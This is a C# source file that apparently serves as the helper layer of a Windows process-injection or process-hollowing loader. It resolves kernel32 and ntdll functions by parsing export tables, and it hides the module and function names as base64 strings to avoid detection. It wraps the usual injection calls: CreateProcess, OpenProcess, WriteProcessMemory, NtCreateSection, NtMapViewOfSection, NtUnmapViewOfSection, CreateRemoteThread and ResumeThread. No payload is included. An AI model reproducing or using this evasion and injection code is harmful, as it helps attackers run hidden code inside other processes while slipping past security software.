using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

/*
typedef public struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res1[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_OPTIONAL_HEADER32 {
    WORD                 Magic;
    BYTE                 MajorLinkerVersion;
    BYTE                 MinorLinkerVersion;
    DWORD                SizeOfCode;
    DWORD                SizeOfInitializedData;
    DWORD                SizeOfUninitializedData;
    DWORD                AddressOfEntryPoint;
    DWORD                BaseOfCode;
    DWORD                BaseOfData;
    DWORD                ImageBase;
    DWORD                SectionAlignment;
    DWORD                FileAlignment;
    WORD                 MajorOperatingSystemVersion;
    WORD                 MinorOperatingSystemVersion;
    WORD                 MajorImageVersion;
    WORD                 MinorImageVersion;
    WORD                 MajorSubsystemVersion;
    WORD                 MinorSubsystemVersion;
    DWORD                Win32VersionValue;
    DWORD                SizeOfImage;
    DWORD                SizeOfHeaders;
    DWORD                CheckSum;
    WORD                 Subsystem;
    WORD                 DllCharacteristics;
    DWORD                SizeOfStackReserve;
    DWORD                SizeOfStackCommit;
    DWORD                SizeOfHeapReserve;
    DWORD                SizeOfHeapCommit;
    DWORD                LoaderFlags;
    DWORD                NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory

typedef struct _IMAGE_EXPORT_DIRECTORY {
    public DWORD Characteristics;
    public DWORD TimeDateStamp;
    public WORD  MajorVersion;
    public WORD  MinorVersion;
    public DWORD Name;
    public DWORD Base;
    public DWORD NumberOfFunctions;
    public DWORD NumberOfNames;
    public DWORD AddressOfFunctions;
    public DWORD AddressOfNames;
    public DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
*/

public static class Utility
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    public enum CONTEXT_FLAGS : uint
    {
        CONTEXT_i386 = 0x10000,
        CONTEXT_i486 = 0x10000,   //  same as i386
        CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
        CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
        CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
        CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
        CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
        CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
        CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
        CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct M128A
    {
        public ulong High;
        public long Low;

        public override string ToString()
        {
            return string.Format("High:{0}, Low:{1}", this.High, this.Low);
        }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct XSAVE_FORMAT64
    {
        public ushort ControlWord;
        public ushort StatusWord;
        public byte TagWord;
        public byte Reserved1;
        public ushort ErrorOpcode;
        public uint ErrorOffset;
        public ushort ErrorSelector;
        public ushort Reserved2;
        public uint DataOffset;
        public ushort DataSelector;
        public ushort Reserved3;
        public uint MxCsr;
        public uint MxCsr_Mask;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public M128A[] FloatRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public M128A[] XmmRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
        public byte[] Reserved4;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;

        public CONTEXT_FLAGS ContextFlags;
        public uint MxCsr;

        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;

        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;

        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;

        public XSAVE_FORMAT64 DUMMYUNIONNAME;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public M128A[] VectorRegister;
        public ulong VectorControl;

        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }

    public static IntPtr GetFunctionAddress(string b64_moduleName, string b64_functionName)
    {
        string moduleName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64_moduleName));
        var res = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
            .Where(module => moduleName.Equals(Path.GetFileName(module.FileName), StringComparison.OrdinalIgnoreCase));
        if (res.Count() == 0)
            return IntPtr.Zero;
        IntPtr modulePtr = res.FirstOrDefault().BaseAddress;

        byte[] e_magic = new byte[2];
        Marshal.Copy(modulePtr, e_magic, 0, e_magic.Length);
        if (Encoding.UTF8.GetString(e_magic) != "MZ")
            return IntPtr.Zero;

        Int32 e_lfanew = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + 0x3C));

        byte[] signature = new byte[4];
        Marshal.Copy((IntPtr)(modulePtr + e_lfanew), signature, 0, signature.Length);
        if (!signature.SequenceEqual(Encoding.UTF8.GetBytes("PE\0\0")))
            return IntPtr.Zero;

        IntPtr OptionalHeader = (IntPtr)(modulePtr.ToInt64() + e_lfanew + 0x18);
        IntPtr DataDirectory = (IntPtr)(OptionalHeader + (Marshal.ReadInt16((IntPtr)OptionalHeader) == 0x10b ? 0x60 : 0x70));

        Int32 ExportDirectory = Marshal.ReadInt32((IntPtr)DataDirectory);
        Int32 numberOfNames = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + ExportDirectory + 0x18));
        Int32 addressOfFunctions = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + ExportDirectory + 0x1C));
        Int32 addressOfNames = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + ExportDirectory + 0x20));
        Int32 addressOfNameOrdinals = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + ExportDirectory + 0x24));

        string functionName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64_functionName));
        for (int i = 0; i < numberOfNames; i++)
        {
            Int32 nameRVA = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + addressOfNames + i * 4));
            string name = Marshal.PtrToStringAnsi((IntPtr)(modulePtr.ToInt64() + nameRVA));
            if (functionName.Equals(name, StringComparison.OrdinalIgnoreCase))
            {
                Int32 ordinal = Marshal.ReadInt16((IntPtr)(modulePtr.ToInt64() + addressOfNameOrdinals + i * 2));
                Int32 functionRVA = Marshal.ReadInt32((IntPtr)(modulePtr.ToInt64() + addressOfFunctions + ordinal * 4));
                return (IntPtr)((Int64)modulePtr + functionRVA);
            }
        }
        return IntPtr.Zero;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void SleepDelegate(uint dwMilliseconds);
    public static void Sleep(uint dwMilliseconds)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U2xlZXA=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(SleepDelegate));
        object[] args = { dwMilliseconds };
        funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    public static bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q3JlYXRlUHJvY2Vzc0E=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(CreateProcessDelegate));
        lpProcessInformation = new PROCESS_INFORMATION();
        object[] args = { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation };
        bool res = (bool)funcDelegate.DynamicInvoke(args);
        lpProcessInformation = (PROCESS_INFORMATION)args[9];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 ZwQueryInformationProcessDelegate(IntPtr hProcess, Int32 procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
    public static UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "WndRdWVyeUluZm9ybWF0aW9uUHJvY2Vzcw==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(ZwQueryInformationProcessDelegate));
        object[] args = { hProcess, procInformationClass, procInformation, ProcInfoLen, retlen };
        UInt32 res = (UInt32)funcDelegate.DynamicInvoke(args);
        procInformation = (PROCESS_BASIC_INFORMATION)args[2];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, ref IntPtr lpNumberOfBytesRead)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "UmVhZFByb2Nlc3NNZW1vcnk=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(ReadProcessMemoryDelegate));
        object[] args = { hProcess, lpBaseAddress, lpBuffer, dwSize, lpNumberOfBytesRead };
        bool res = (bool)funcDelegate.DynamicInvoke(args);
        lpBuffer = (byte[])args[2];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetCurrentProcessDelegate();
    public static IntPtr GetCurrentProcess()
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "R2V0Q3VycmVudFByb2Nlc3M=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(GetCurrentProcessDelegate));
        return (IntPtr)funcDelegate.DynamicInvoke();
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
    public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "T3BlblByb2Nlc3M=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(OpenProcessDelegate));
        object[] args = { processAccess, bInheritHandle, processId };
        return (IntPtr)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "V3JpdGVQcm9jZXNzTWVtb3J5");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(WriteProcessMemoryDelegate));
        object[] args = { hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten };
        return (bool)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
    public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtProtectVirtualMemoryDelegate));
        object[] args = { ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection };
        UInt32 res = (UInt32)funcDelegate.DynamicInvoke(args);
        OldAccessProtection = (UInt32)args[4];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtCreateSectionDelegate(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
    public static UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRDcmVhdGVTZWN0aW9u");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtCreateSectionDelegate));
        object[] args = { SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle };
        UInt32 res = (UInt32)funcDelegate.DynamicInvoke(args);
        SectionHandle = (IntPtr)args[0];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtMapViewOfSectionDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
    public static uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRNYXBWaWV3T2ZTZWN0aW9u");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtMapViewOfSectionDelegate));
        object[] args = { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };
        uint res = (uint)funcDelegate.DynamicInvoke(args);
        BaseAddress = (IntPtr)args[2];
        SectionOffset = (ulong)args[5];
        ViewSize = (uint)args[6];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtUnmapViewOfSectionDelegate(IntPtr hProc, IntPtr baseAddr);
    public static uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRVbm1hcFZpZXdPZlNlY3Rpb24=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtUnmapViewOfSectionDelegate));
        object[] args = { hProc, baseAddr };
        return (uint)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtCloseDelegate(IntPtr hObject);
    public static int NtClose(IntPtr hObject)
    {
        IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRDbG9zZQ==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtCloseDelegate));
        object[] args = { hObject };
        return (int)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q3JlYXRlUmVtb3RlVGhyZWFk");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(CreateRemoteThreadDelegate));
        object[] args = { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        return (IntPtr)funcDelegate.DynamicInvoke(args);
    }

    /*
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenThreadDelegate(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    public static IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "T3BlblRocmVhZA==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(OpenThreadDelegate));
        object[] args = { dwDesiredAccess, bInheritHandle, dwThreadId };
        return (IntPtr)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int SuspendThreadDelegate(IntPtr hThread);
    public static int SuspendThread(IntPtr hThread)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U3VzcGVuZFRocmVhZA==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(SuspendThreadDelegate));
        object[] args = { hThread };
        return (int)funcDelegate.DynamicInvoke(args);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
    public static bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "R2V0VGhyZWFkQ29udGV4dA==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(GetThreadContextDelegate));
        object[] args = { hThread, lpContext };
        bool res = (bool)funcDelegate.DynamicInvoke(args);
        lpContext = (CONTEXT64)args[1];
        return res;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
    public static bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U2V0VGhyZWFkQ29udGV4dA==");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(SetThreadContextDelegate));
        object[] args = { hThread, lpContext };
        bool res = (bool)funcDelegate.DynamicInvoke(args);
        lpContext = (CONTEXT64)args[1];
        return res;
    }
    */

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint ResumeThreadDelegate(IntPtr hThread);
    public static uint ResumeThread(IntPtr hThread)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "UmVzdW1lVGhyZWFk");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(ResumeThreadDelegate));
        object[] args = { hThread };
        return (uint)funcDelegate.DynamicInvoke(args);
    }

    /*
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool CloseHandleDelegate(IntPtr hObject);
    public static bool CloseHandle(IntPtr hObject)
    {
        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q2xvc2VIYW5kbGU=");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(CloseHandleDelegate));
        object[] args = { hObject };
        return (bool)funcDelegate.DynamicInvoke(args);
    }
    */
}
